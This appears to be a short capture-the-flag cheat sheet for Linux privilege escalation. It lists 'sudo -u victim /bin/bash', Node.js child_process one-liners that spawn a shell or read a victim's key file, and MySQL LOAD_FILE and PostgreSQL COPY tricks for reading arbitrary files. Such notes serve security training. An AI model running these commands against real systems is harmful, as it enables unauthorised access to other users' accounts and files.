# PrivEsc

Look in:

* /tmp
* /var/tmp
* /etc
* /etc/cron.daily-weekly-monthly

sudo -l
sudo -u victim /bin/bash

------------------------------------------------------------------------------- 

## JavaScript

node -e '...'

var exec = require('child_process').exec;
exec('/bin/bash', function (error, stdOut, stdErr) {
console.log(stdOut);
}); 

node -e "var exec = require('child_process').exec; exec(['cat /home/victim/key.txt'], function (error, stdOut, stdErr) {console.log(stdOut);});"

const { exec } = require('child_process');
exec('cat /home/victim/key.txt', (err, stdout, stderr) => {
  if (err) {
    //some err occurred
    console.error(err)
  } else {
   // the *entire* stdout and stderr (buffered)
   console.log(`stdout: ${stdout}`);
   console.log(`stderr: ${stderr}`);
  }
});

-------------------------------------------------------------------------------

## Mysql

SELECT LOAD_FILE('/var/lib/mysql-files/key.txt') AS Result;

-------------------------------------------------------------------------------

## Postgres

In this challenge, the user postgres has a trivial password. Once you get access to this account you should be able to connect to the local PostgreSQL database by running psql

Once you gain access, you can navigate the database using:

\list to list the databases
\c [DATABASE] to select the database [DATABASE]
\d to list the tables

SELECT * FROM users;   (case sensitive)

You can read files from the file system using:

# CREATE TABLE demo(t text);
# COPY demo from '[FILENAME]';
# SELECT * FROM demo;
# Where [FILENAME] is the filename.

-------------------------------------------------------------------------------

## Sqlite

$ sqlite3 [FILENAME]

Once you gain access to it, you can navigate the content using:

.tables to get a list of tables.

SELECT .... to extract the content of a table using SQL

-------------------------------------------------------------------------------

